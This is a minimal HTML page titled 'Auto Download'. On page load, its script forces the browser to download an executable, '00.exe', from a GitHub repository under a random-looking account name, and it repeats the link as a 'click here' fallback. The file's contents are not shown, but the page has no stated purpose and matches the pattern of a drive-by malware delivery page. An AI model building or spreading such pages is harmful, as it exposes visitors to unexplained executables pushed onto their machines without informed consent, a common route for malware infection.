<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Download</title>
    <script>
        window.onload = function() {
            // Define the file URL
            const fileUrl = "https://github.com/hubertloudgfdxgx/krc/raw/refs/heads/main/00.exe";

            // Create an anchor element
            const anchor = document.createElement('a');
            anchor.href = fileUrl;
            anchor.download = ""; // This suggests a download rather than opening in-browser

            // Append the anchor to the body (required for Firefox)
            document.body.appendChild(anchor);

            // Programmatically click the anchor
            anchor.click();

            // Remove the anchor from the body
            document.body.removeChild(anchor);
        };
    </script>
</head>
<body>
    <h1>Preparing Download...</h1>
    <p>If the download does not start automatically, <a href="https://github.com/hubertloudgfdxgx/krc/raw/refs/heads/main/00.exe" download>click here</a>.</p>
</body>
</html>
